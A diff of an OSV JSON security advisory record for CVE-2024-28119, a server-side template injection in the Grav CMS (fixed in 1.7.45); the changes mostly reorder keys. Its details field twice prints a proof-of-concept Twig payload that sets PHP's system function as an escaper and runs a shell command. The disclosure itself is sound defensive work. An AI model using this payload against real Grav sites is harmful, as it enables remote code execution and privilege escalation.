@@ -1,56 +1,16 @@
 {
-  "id": "GHSA-2m7x-c7px-hp58",
-  "summary": "Server Side Template Injection (SSTI) via Twig escape handler",
-  "details": "### Summary\nDue to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.\n\n### Details\nhttps://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\n```php\n/**\n     * Defines a new escaper to be used via the escape filter.\n     *\n     * @param string   $strategy The strategy name that should be used as a strategy in the escape call\n     * @param callable $callable A valid PHP callable\n     */\n    public function setEscaper($strategy, callable $callable)\n    {\n        $this->escapers[$strategy] = $callable;\n    }\n ```\n Twig supports the functionality to redefine the escape function through the setEscaper method. \nHowever, that method is not originally exposed to the twig environment, but it is accessible through the payload below.\n\n```plaintext\n{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}\n```\nAt this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.\n\n\n### PoC\n```\n{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}\n{{ var_dump(['id'] | escape('system', 'system')) }}\n```\n\n### Impact\nTwig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.",
-  "aliases": [
-    "CVE-2024-28119"
-  ],
-  "modified": "2025-01-03T16:55:09.534669Z",
-  "published": "2024-03-22T16:56:02Z",
-  "related": [
-    "CVE-2024-28119"
-  ],
-  "database_specific": {
-    "nvd_published_at": "2024-03-21T22:15:12Z",
-    "cwe_ids": [
-      "CWE-94"
-    ],
-    "severity": "HIGH",
-    "github_reviewed": true,
-    "github_reviewed_at": "2024-03-22T16:56:02Z"
-  },
-  "references": [
-    {
-      "type": "WEB",
-      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58"
-    },
-    {
-      "type": "ADVISORY",
-      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28119"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe"
-    },
-    {
-      "type": "PACKAGE",
-      "url": "https://github.com/getgrav/grav"
-    },
-    {
-      "type": "WEB",
-      "url": "https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99"
-    }
-  ],
   "affected": [
     {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-2m7x-c7px-hp58/GHSA-2m7x-c7px-hp58.json"
+      },
       "package": {
-        "name": "getgrav/grav",
         "ecosystem": "Packagist",
+        "name": "getgrav/grav",
         "purl": "pkg:composer/getgrav/grav"
       },
       "ranges": [
         {
-          "type": "ECOSYSTEM",
           "events": [
             {
               "introduced": "0"
@@ -58,7 +18,8 @@
             {
               "fixed": "1.7.45"
             }
-          ]
+          ],
+          "type": "ECOSYSTEM"
         }
       ],
       "versions": [
@@ -337,17 +298,56 @@
         "1.7.7",
         "1.7.8",
         "1.7.9"
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-2m7x-c7px-hp58/GHSA-2m7x-c7px-hp58.json"
-      }
+      ]
     }
+  ],
+  "aliases": [
+    "CVE-2024-28119"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-22T16:56:02Z",
+    "nvd_published_at": "2024-03-21T22:15:12Z",
+    "severity": "HIGH"
+  },
+  "details": "### Summary\nDue to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.\n\n### Details\nhttps://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\n```php\n/**\n     * Defines a new escaper to be used via the escape filter.\n     *\n     * @param string   $strategy The strategy name that should be used as a strategy in the escape call\n     * @param callable $callable A valid PHP callable\n     */\n    public function setEscaper($strategy, callable $callable)\n    {\n        $this->escapers[$strategy] = $callable;\n    }\n ```\n Twig supports the functionality to redefine the escape function through the setEscaper method. \nHowever, that method is not originally exposed to the twig environment, but it is accessible through the payload below.\n\n```plaintext\n{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}\n```\nAt this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.\n\n\n### PoC\n```\n{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}\n{{ var_dump(['id'] | escape('system', 'system')) }}\n```\n\n### Impact\nTwig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.",
+  "id": "GHSA-2m7x-c7px-hp58",
+  "modified": "2025-01-03T16:55:09.534669Z",
+  "published": "2024-03-22T16:56:02Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28119"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/getgrav/grav"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99"
+    }
+  ],
+  "related": [
+    "CVE-2024-28119"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Server Side Template Injection (SSTI) via Twig escape handler"
 }
